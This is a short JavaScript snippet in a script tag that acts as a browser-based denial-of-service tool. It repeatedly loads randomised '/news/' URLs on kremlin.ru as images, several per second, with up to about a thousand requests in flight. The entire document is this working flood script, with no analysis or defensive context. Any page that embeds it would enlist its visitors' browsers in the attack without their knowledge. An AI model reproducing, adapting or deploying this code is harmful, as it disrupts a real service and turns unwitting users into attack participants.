<script>
(function () {
	var targetURL = "http://kremlin.ru";
	var fireInterval;
	var isFiring = false;
	var requestsHT = {};
	var requestedCtr = 0,
		succeededCtr = 0,
		failedCtr = 0;
	var makeHttpRequest = function () {
			if (requestedCtr > failedCtr + succeededCtr + 1000) {
				return;
			};
			var rID = 12500 + Math.floor(Math.random()*1500); 
			var img = new Image();
			img.onerror = function () { onFail(rID); };
			img.onabort = function () { onFail(rID); };
			img.onload = function () { onSuccess(rID); };
			img.setAttribute("src", targetURL + "/news/" + rID);
			requestsHT[rID] = img;
			onRequest(rID);
		};
	var onRequest = function (rID) {
			requestedCtr++;
		};
	var onComplete = function (rID) {
			delete requestsHT[rID];
		};
	var onFail = function (rID) {
			failedCtr++;
			delete requestsHT[rID];
		};
	var onSuccess = function (rID) {
			succeededCtr++;
			delete requestsHT[rID];
		};
	fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(5) | 0));
})();
</script>
